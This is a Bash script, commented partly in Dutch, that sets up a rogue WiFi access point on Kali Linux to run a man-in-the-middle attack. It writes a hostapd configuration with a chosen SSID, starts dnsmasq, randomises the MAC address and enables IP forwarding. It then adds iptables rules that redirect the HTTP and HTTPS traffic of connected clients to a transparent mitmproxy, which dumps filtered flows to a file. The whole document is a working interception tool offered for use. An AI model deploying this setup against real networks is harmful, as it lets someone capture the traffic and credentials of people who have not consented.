#index
	#With this script you can run a MitM attack while hosting a WiFi network. The script lets you determine which SSID to use and the internet facing 
	#interface for redirecting the HTTP and HTTPS traffic to the transparent proxy. It uses the mitmproxy application suite wherefor you need to install 
	#the certificate to seamlessly intercept the traffic without any clientsided SSL errors.
	#When running the script it will dump all filtered HTTP flows to a file in it's current folder in mitmproxy format. The filter expression can be found at 
	#https://mitmproxy.org.

#vars
	dt=$(date '+%d/%m/%Y %H:%M:%S');
	ban=$dt' [mitm.sh]'
	con=$dt' [mitm.sh] :'
	filter='~u keys'

#functionlist
	ctrl_c() {
	echo -e "$con ctrl +c pressed. Quiting mitm script."
	pkill dnsmasq
	pkill hostapd
	exit 1
	}
	trap ctrl_c INT

	app_check_dns() {
	if [[ $(pkill -c dnsmasq) != 0 ]]; then
		echo "$con ERROR app_check: dnsmasq instance allready running, killing it to start a new daemon"
		pkill dnsmasq
		dnsmasq --conf-file=dnsmasq.conf 
	else
		echo "$con app_check: Starting new dnsmasq instance.. this takes ~5 seconds"
		dnsmasq --conf-file=dnsmasq.conf
	fi
	}

	app_check_hostapd() {
	if [[ $(pkill -c hostapd) != 0 ]]; then
		echo "$con ERROR app_check: hostapd instance allready running, killing it to start a new daemon"
		pkill hostapd
		hostapd ./hostapd.conf -B $1>/dev/null 
	else
		echo "$con app_check: Starting new hostapd instance.. this takes ~5 seconds"
		hostapd ./hostapd.conf -B $1>/dev/null
	fi
	}

#banner
	clear
	echo "$con Starting mitm"
	sleep 1
	echo "+----------------------------------------------------+"
	printf "| %-50s |\n" "$ban"
	printf "| %-50s |\n" "Dit script start een mitm proxy. Het script"
	printf "| %-50s |\n" "configureerd een aantal applicaties op basis van"
	printf "| %-50s |\n" "jouw input."
	printf "| %-50s |\n" "Je kan het script stoppen door ctrl+c te enteren"
	printf "| %-50s |\n" "Applicatielijst:"
	printf "| %-50s |\n" "-hostapd"
	printf "| %-50s |\n" "-dnsmasq"
	printf "| %-50s |\n" "-mitmproxy"
	echo "+----------------------------------------------------+"
	sleep 1

#recognize OS
	if [[ $(uname -a) != *"kali"* ]]; then
	   echo "$con ERROR OS type: Not running on Kali, script is not build for this. Go run Kali!"
	   exit 1
	else
	   echo "$con Seems like you are running on Kali, which is good. I'll continue!"
	   sleep 1
	fi

#Functie om je internet facing interface te bepalen
	inetint=$(route -F | awk '/default/ {print $8}')
	mitm_int() {
		if [[ $(route -F | awk '/default/ {print $8}') = $int ]]; then
		   echo "$con ERROR int selection: The interface you want to configure is used for internet access. Please select the interface where the MitM connection is hosted on"
		else
		   echo "$con Interface selected"
		fi
	}

	
#vraag de user om de internet facing interface in te vullen.
	echo -n "$con What interface faces the MitM network? [!$inetint]:"
	read input1
	if [[ -z "$input" ]]; then
      		int=$inetint
	else
		int=$input1
	fi
	mitm_int

#bouw de hostapd configuratie op
	echo -n "$con Enter the SSID you would like to run [mitmproxy]:"
	read input2
	if [[ -z "$input2" ]]; then
	  ssid=mitmproxy
	else
	  ssid=$input2
	fi
	
	echo -e "interface=wlan0" > hostapd.conf
	echo -e "driver=nl80211" >> hostapd.conf
	echo -e "ssid=$ssid" >> hostapd.conf
	echo -e "channel=6" >> hostapd.conf

#checking if dnsmasq instance is already running.
	app_check_dns

#commandlist no smartnes needed
	nmcli radio wifi off $1> /dev/null
	rfkill unblock wlan $1> /dev/null
	ifconfig wlan0 down $1> /dev/null
	macchanger -r wlan0 $1> /dev/null
	echo "$con commandlist: macchanger ran"
	ifconfig wlan0 10.200.200.1/24 up $1> /dev/null
	sysctl -w net.ipv4.ip_forward=1 $1> /dev/null
	iptables -t nat -A PREROUTING -i $int -p tcp --dport 80 -j REDIRECT --to-port 8080
	iptables -t nat -A PREROUTING -i $int -p tcp --dport 443 -j REDIRECT --to-port 8080

#app_check hostapd daemen and running it
	app_check_hostapd
	echo "$con Hosting SSID = $ssid"

#mitmdump -m transparent -w test.dump filter_args $filter
